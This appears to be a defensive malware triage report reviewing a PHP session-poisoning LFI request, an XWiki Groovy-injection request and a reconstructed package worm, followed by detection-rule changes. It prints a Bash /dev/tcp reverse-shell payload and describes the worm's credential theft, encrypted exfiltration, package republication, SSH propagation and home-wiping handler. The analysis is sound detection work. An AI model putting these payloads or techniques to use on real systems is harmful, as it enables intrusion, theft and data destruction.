# PHP session, XWiki, and recovered package-worm review

All three supplied samples are **MALICIOUS**. This is a static review: no
sample, generated command, recovered installer, or payload was executed.
Sanitized hostnames and proof markers do not establish authorization to test.
Neither HTTP capture proves a successful compromise.

## Identification and execution paths

* `eda0f33972f3…`: PHP upload-progress session-poisoning/LFI exploit request.
  The session cookie and query target identify the same session. Multipart
  `PHP_SESSION_UPLOAD_PROGRESS` causes upload metadata, including the PHP-bearing
  filename, to enter session storage when that server feature is enabled. The
  query attempts inclusion of that session file. The injected `system` call
  decodes `aWQ=` to `id`, between output markers. This is command execution via
  an exploit, with no evidence of persistence, theft, or a reverse shell. The
  server configuration, vulnerable include implementation, timing, and testing
  authorization are unavailable. Existing three hostile and three suspicious
  observations correctly describe this request and remain unchanged.
* `b3243a959775…`: XWiki SolrSearch Groovy-injection request. URL/form decoding
  yields `}}}{{async async=false}}{{groovy}}`, followed by a quoted command's
  `.execute().text`. Its command is `/bin/bash -i >& /dev/tcp/<address>/9001
  0>&1`. The arbitrary Groovy/process-execution injection and explicit reverse
  shell payload tip the verdict. Groovy String.execute does not itself supply
  shell parsing: the redirections passed this way need not work. The verdict
  concerns the exploit payload, not an observed callback or successful shell.
* `ddeb09818141…`: an analyst-created reconstruction of the repository's
  testmetest/Miasma package-worm payload. It is not the original registry
  tarball. The intact source hashes to
  `bc6ec3d62114e7c43c8ac589f95682a67dd4b9e8ff14d50aa5466eec197c907c`,
  matching the existing recovery manifest. All 38 function/class slice hashes
  match that manifest; all 16 resource literals match their extracted files;
  and every regular archive member matches the supplied extraction.

The recovered source still contains its string-array rotation/decoder and
PBKDF2/SHA-256 permutation-cipher implementations, but the reconstructed call
sites and AES-GCM/gzip resource bindings have already been replaced by plaintext.
The existing recovery scripts were inspected as reconstruction provenance,
not executed as evidence of runtime behavior.

The archive's top-level `T5` calls `up`, collects initial results with `cd`,
creates senders with `wd`, streams additional providers, and runs the actions
selected by `tp` through `rp`. The audited paths include:

* `ip`/`tl`/`up`: decoy credential, analysis-directory, hostname, and locale
  checks can terminate execution; `fp` detaches a child and registers deletion
  of its running source on exit.
* `Ac`, `Sc`, and `Bc`: collect sensitive files/environment, AI-agent credential
  files, and runner secrets. `Bc` finds `Runner.Worker` in procfs, supplies `ts`
  to privileged Python, and extracts secret records from the memory dump.
  AWS, GCP, Vault, and Kubernetes providers query available secret stores.
* `mr`/`Zn`/`Ei`: gzip and hybrid RSA/AES encrypt collected envelopes; send them
  through repository content writes or HTTPS POST. `Zn` also AES-encrypts its
  token, formats it like a GitHub PAT, and places the encoded result into a
  commit message. Formatting alone is neutral and does not prove this flow.
* Collector token-validation branches invoke `qo`, `la`, and `fa`, which alter
  npm, wheel, and gem contents before attempted republication. `Dr` introduces
  a node-gyp command substitution; wheel rebuilding inserts a startup `.pth`
  member; gem rebuilding adds an extension script. `Vo` defaults to
  reconnaissance, so cache mutation is a capability/conditional path.
* `tc` includes `Wa`; `rp` invokes it when SSH/SCP are available. `Wa` discovers
  hosts from SSH/netrc files, checks noninteractive access, copies its own
  source and bootstrap via SCP stdin, runs the bootstrap remotely, and cleans
  the remote staging directory. The detection combinations honestly state
  co-occurrence rather than complete interprocedural byte-flow proof.
* `Ud`/`is`/`El` verify and decode signed commit messages and evaluate script
  tasking; `Rl` provides a GitLab alternative. `Xc.py` independently polls
  signed GitHub commit messages for script URLs, writes/downloads the script,
  runs Python, and removes the temporary file. `Zc.sh` installs that monitor
  through systemd or launchd.
* `Zn.augmentEnvelope` passes a home-wiping handler to `$c`; `$c` feeds `Qc.sh`
  to Bash with token/handler arguments. That installed monitor evaluates the
  handler when the token receives HTTP 401/403. This is deliberate destructive
  behavior, beyond ordinary package administration or secret auditing.

Successful authentication, remote hosts, victim data, and installation history
are unavailable. The credential export, self-propagation, and destructive
handler together strongly support malicious intent without those circumstances.

## Changes and the shared-rule correction

Added complete encoded reverse-shell stdio detection, a neutral quoted-string
execute-expression observation, wheel `.pth` member construction and its PyPI
upload combination, and neutral GitHub PAT-shaped data construction. The hostile
reverse-shell composite has authoring precision **3.8** and requires both the
complete I/O skeleton and the existing numeric-callback observation.

The old `js-dashed-split-token-string` matcher was just the literal
`["split"]('-')` in a JavaScript file of at least 50 KB. Here it matches ordinary
version parsing, including removing a semver prerelease suffix in `Dr`. It does
not establish string-array concealment. The exact matcher, minimum size, file
type, and Windows scope were retained under
`micro-behaviors/data/string/split::js-large-bracket-hyphen-split`, at notable
severity. The JScript conditional-comment reconstruction consumer now references
that neutral observation and retains its other required attack evidence.

The four ancestor-directory consumers were reviewed. Three require actual
concealment and should no longer accept ordinary splitting as its only proof;
the ELF-only fourth cannot consume this JavaScript observation. The explicit
JScript consumer retains the exact population. Existing controls and an external
JScript stage fixture were checked, alongside ordinary version parsing and a
complete conditional-comment reconstruction positive. No technique was erased.

## Comparison and limits

Counts below are unique rule IDs per reported file, including archive rollups;
they are not independent proofs. `archive-comparison.json` records exact changes.

| Input | Hostile before → after | Suspicious before → after |
|---|---:|---:|
| PHP session request | 3 → 3 | 3 → 3 |
| XWiki request | 2 → 3 | 3 → 4 |
| Reconstructed archive | 6 → 6 | 24 → 24 |
| `payload.js` | 1 → 1 | 17 → 17 |
| `Xc.py` | 2 → 2 | 0 → 0 |
| `functions/25-Zn.js` | 1 → 1 | 2 → 2 |
| `functions/24-Wa.js` | 0 → 0 | 2 → 2 |

The only intentionally lost suspicious ID is the unsupported obfuscation claim;
its accurate string-splitting observation survives. All hostile detections and
all other prior suspicious detections are preserved. Archive suspicious counts
stay level because the added `.pth` republication finding replaces that false
obfuscation signal.

The initial baseline command accidentally enabled reference following by using
`--follow none` instead of `--follow=none`. To avoid treating analysis-mode
differences as rule losses, the archive was rescanned against a clean `git HEAD`
trait snapshot with identical `slow`, `local`, `follow=none` options. That
controlled baseline retained 6 hostile/24 suspicious; its notable count was
1137, whereas the initial followed scan reported 1145. No YAML change accounts
for that mode-dependent difference.

The XWiki ML model remains benign (`lvl=-1`) despite the hostile rules and the
analyst verdict. Its probability changes from 0.97872835 to 0.933367 after the
new coverage. The session request remains flagged at level 0; the archive at
level 25 with probability 0.98. No inaccurate trait was kept to raise a score.
The scanner also reports an older model feature specification.

The large payload's flow facts explicitly report analysis/node budgets and
unresolved helpers. Generic capabilities and suspicious correlations do not
claim full SSH, token-upload, or package-republication data flow. Cleave matches
the new PAT-construction rule in the intact source, while atomscan retains it
on the exact `Zn` slice and archive rollup rather than the full member's output.
These are analysis/reporting limits, not evidence against the audited behavior.

Run `python3 testdata/triage/http-miasma-second-review/verify.py RECOVERED_DIR`
for the focused controls and exact recovered-source checks. Finish rule changes
with `make validate`.
